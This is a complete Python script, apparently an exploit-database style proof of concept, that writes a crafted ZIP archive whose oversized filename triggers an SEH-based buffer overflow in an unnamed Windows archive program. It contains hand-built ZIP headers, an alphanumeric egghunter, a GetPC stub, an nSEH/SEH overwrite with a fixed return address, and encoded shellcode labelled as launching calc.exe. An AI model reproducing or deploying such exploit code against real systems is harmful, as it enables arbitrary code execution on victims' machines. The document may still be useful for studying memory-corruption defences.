#!/usr/bin/python

import os,struct

filename = "exploit.zip"

ldf_header = ("\x50\x4B\x03\x04\x14\x00\x00"
"\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00"
"\xe4\x0f"# file size
"\x00\x00\x00")

cdf_header = ("\x50\x4B\x01\x02\x14\x00\x14"
"\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\xe4\x0f" # file size
"\x00\x00\x00\x00\x00\x00\x01\x00"
"\x24\x00\x00\x00\x00\x00\x00\x00")

eofcdf_header = ("\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
"\x12\x10\x00\x00"# Size of central directory (bytes)
"\x02\x10\x00\x00"# Offset of start of central directory,
"\x00\x00")           # relative to start of archive

# Calc.exe
shellcode = ("\x89\xe3\xdb\xc7\xd9\x73\xf4\x58\x50\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x69\x6c\x4b\x58\x4e\x62\x77\x70\x43\x30\x47\x70\x75\x30\x4d"
"\x59\x48\x65\x55\x61\x39\x50\x75\x34\x4e\x6b\x76\x30\x74\x70"
"\x6c\x4b\x31\x42\x74\x4c\x4c\x4b\x62\x72\x62\x34\x4e\x6b\x34"
"\x32\x61\x38\x74\x4f\x4d\x67\x51\x5a\x31\x36\x64\x71\x59\x6f"
"\x6c\x6c\x75\x6c\x45\x31\x43\x4c\x37\x72\x64\x6c\x37\x50\x59"
"\x51\x4a\x6f\x56\x6d\x63\x31\x59\x57\x78\x62\x58\x72\x32\x72"
"\x43\x67\x4e\x6b\x53\x62\x54\x50\x4c\x4b\x50\x4a\x65\x6c\x4c"
"\x4b\x32\x6c\x52\x31\x54\x38\x6d\x33\x50\x48\x35\x51\x4b\x61"
"\x73\x61\x6c\x4b\x43\x69\x57\x50\x63\x31\x6e\x33\x4e\x6b\x37"
"\x39\x37\x68\x58\x63\x76\x5a\x31\x59\x6c\x4b\x50\x34\x6e\x6b"
"\x37\x71\x6b\x66\x55\x61\x59\x6f\x6c\x6c\x4b\x71\x38\x4f\x64"
"\x4d\x75\x51\x38\x47\x67\x48\x39\x70\x62\x55\x7a\x56\x56\x63"
"\x31\x6d\x69\x68\x47\x4b\x71\x6d\x34\x64\x51\x65\x49\x74\x31"
"\x48\x4c\x4b\x76\x38\x75\x74\x33\x31\x4e\x33\x75\x36\x6e\x6b"
"\x34\x4c\x50\x4b\x4e\x6b\x50\x58\x45\x4c\x47\x71\x4e\x33\x4c"
"\x4b\x37\x74\x6c\x4b\x77\x71\x6e\x30\x6f\x79\x63\x74\x35\x74"
"\x37\x54\x73\x6b\x71\x4b\x55\x31\x61\x49\x61\x4a\x50\x51\x4b"
"\x4f\x49\x70\x71\x4f\x71\x4f\x73\x6a\x6e\x6b\x65\x42\x58\x6b"
"\x6e\x6d\x63\x6d\x62\x4a\x57\x71\x4e\x6d\x4f\x75\x58\x32\x67"
"\x70\x45\x50\x53\x30\x46\x30\x70\x68\x30\x31\x6e\x6b\x30\x6f"
"\x6f\x77\x59\x6f\x79\x45\x6f\x4b\x6b\x50\x47\x6d\x35\x7a\x77"
"\x7a\x53\x58\x59\x36\x6a\x35\x6f\x4d\x4d\x4d\x59\x6f\x39\x45"
"\x67\x4c\x63\x36\x73\x4c\x46\x6a\x4d\x50\x39\x6b\x6b\x50\x73"
"\x45\x67\x75\x6d\x6b\x67\x37\x44\x53\x64\x32\x62\x4f\x63\x5a"
"\x73\x30\x70\x53\x59\x6f\x69\x45\x45\x33\x35\x31\x70\x6c\x65"
"\x33\x54\x6e\x53\x55\x42\x58\x53\x55\x73\x30\x41\x41")

# With base register ESI
egghunter = 'VYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISVK18JKOTO721B2JDB1HXMFNGL35PZRTJOX80W6PVP0TK9IGNO45JJNOT5JGKOM7AA'

longjump = '\x82\x38\x98\x98\x98' # e9 38 ff ff ff (jump back 200 bytes)

# Calls the address directly below the routine.
getpc = ("\x89\x05"
"\x5e"
"\x41"
"\x98\x99"
"\x41"
"\x8a\x94\x98\x98\x98")

nseh = '\x89\x97\x41\x41'
seh = struct.pack("<I",0x00401C19) # 00401C19

payload = 'A' * (1026 - len(nseh + longjump + getpc + egghunter) - 55) # exact match at offset 1026
payload += getpc
payload += egghunter
payload += 'A' * 55
payload += longjump
payload += nseh
payload += seh
payload += 'W00TW00T'
payload += shellcode
payload += 'D' * (4064 - len(payload))
payload += ".txt"

print "Size: " + str(len(payload)) + "\n"
print "Removing old " + filename + " file\n"
os.system("rm " + filename)
print "Creating new file: " + filename + "\n"
file = open(filename, "w")
file.write(ldf_header + payload + cdf_header + payload + eofcdf_header)
file.close()